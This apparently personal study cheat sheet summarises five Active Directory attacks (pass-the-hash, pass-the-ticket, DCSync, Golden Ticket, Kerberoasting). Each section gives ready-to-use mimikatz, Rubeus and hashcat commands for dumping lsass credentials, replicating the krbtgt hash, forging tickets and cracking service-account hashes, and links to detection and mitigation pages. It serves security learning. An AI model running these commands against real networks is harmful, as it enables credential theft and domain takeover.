# Odin Project - Cyberattacks in a nutshell

## Pass the Hash

Abusing the challenge-and-response nature of NTLM to authenticate as a user with only the NTLM hash of the user’s password.

1) Steal password hashes (most common way to do that is extracting hashes from ```lsass.exe``` but you need to have administrative privileges on the computer)
2) Use the pass-the-hash technique to authenticate as the compromised user (by using ```mimikatz sekurlsa::pth``` for example)

More information, demonstration and ways to detect, mitigate and respond: https://attack.stealthbits.com/pass-the-hash-attack-explained


## Pass the Ticket

Using stolen Kerberos tickets to authenticate to resources as a user without compromising that user’s password.

1) Extract Kerberos tickets from ```lsass.exe``` (by using ```mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"``` for example)
2) Inject the stolen TGT into your own session (by using ```mimikatz.exe kerberos::ptt```)

More information, demonstration and ways to detect, mitigate and respond: https://attack.stealthbits.com/pass-the-ticket


## DCSync

Using the Directory Replication Service (DRS) Remote Protocol to replicate data (including credentials) from Active Directory.

1) Compromise an account with the necessary privileges (*Replicating Directory Changes All* and *Replicating Directory Changes*) (by using ```mimikatz.exe "privilege::debug" "sekurlsa::msv"``` for example and then verify the credentials with a simple Pass The Hash)
2) Replicate credentials from Active Directory (by using ```mimikatz.exe "lsadump::dcsync /user:DOMAIN\{user}"```). The most common target for replication is the ```krbtgt``` account, as this account’s password is a prerequisite for a *Golden Ticket*

More information, demonstration and ways to detect, mitigate and respond: https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync


## Golden Ticket

Compromising the ```krbtgt``` user hash to create Kerberos tickets as if you were Active Directory: issuing tickets for users that don’t exist, adding users to groups in which they don’t belong, or issuing tickets with lifetimes far beyond the configured maximum.

The Golden Ticket recipe contains 3 elements:
- Domain name
- Domain SID
- ```krbtgt``` user password hash

1) Compromise the ```krbtgt``` Password Hash (by using ```mimikatz.exe "lsadump::dcsync /user:DOMAIN\KRBTGT"``` for example)
2) Forge Kerberos tickets like TGT using the Golden Ticket (```krbtgt``` Password Hash) with tools like ```mimikatz``` or ```impacket``` (example: ```mimikatz.exe "kerberos::golden /domain:[DOMAIN] /sid:[SID] /aes256:[KRBTGT hash] /user:NonExistentUser /groups:513,2668 /ptt"```)

More information, demonstration and ways to detect, mitigate and respond: https://attack.stealthbits.com/how-golden-ticket-attack-works


## Kerberoasting

*"Abusing traits of the Kerberos protocol to harvest password hashes for Active Directory user accounts with servicePrincipalName (SPN) values (i.e. service accounts). A user is allowed to request a ticket-granting service (TGS) ticket for any SPN, and parts of the TGS may be encrypted with the with RC4 using the password hash of the service account assigned the requested SPN as the key.*"

*"An adversary who is able to extract the TGS tickets from memory, or captures them by sniffing network traffic, can extract the service account’s password hash and attempt an offline brute force attack to obtain the plaintext password."*

1) Enumerate the servicePrincipalNames for the service accounts you wish to Kerberoast (by using an LDAP query for example)
2) Request Kerberos TGS tickets for the services and extract the hashes from memory (by using ```Rubeus.exe kerberoast /simple /outfile:hashes.txt``` or ```mimikatz.exe kerberos::list /export``` for example)
3) Brute force the hashes (by using ```hashcat.exe -m 13100 -o cracked.txt -a 0 .\Hash.txt .\wordlist.txt``` for example)

More information, demonstration and ways to detect, mitigate and respond: https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting
